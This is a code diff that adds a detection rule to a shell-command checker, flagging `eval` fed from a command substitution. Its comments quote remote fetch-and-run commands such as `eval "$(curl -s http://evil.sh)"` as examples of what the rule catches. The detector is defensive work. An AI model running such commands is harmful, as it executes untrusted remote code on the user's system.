@@ -932,6 +932,17 @@ export function shellProgramFromStream(command: string): boolean {
 
   for (let idx = 0; idx < segments.length; idx++) {
     const seg = segments[idx];
+    // `eval "$(cat f)"` / `eval "$(curl -s http://x)"` — a program-executing
+    // consumer fed from a substitution whose OUTPUT we cannot read. Same
+    // semantic test as the pipe case; pipe-vs-substitution is syntax.
+    //
+    // Deliberately ANY substitution, not only data-readers: a reader-only rule
+    // misses `eval "$(curl -s http://evil.sh)"`, remote code and the worst
+    // shape in the set. Measured cost of the broad rule: ZERO occurrences in
+    // 13,647 commands across 671 repos.
+    if (EVAL_EXECS.has(resolve(seg)) && seg.some((w) => w.op === null && w.substs.length)) {
+      return true;
+    }
     if (SHELL_EXECS.has(resolve(seg))) {
       // `bash < file` / `bash <<< str` — the program arrives on stdin.
       for (const w of seg) if (w.op === "<" || w.op === "<<<") return true;
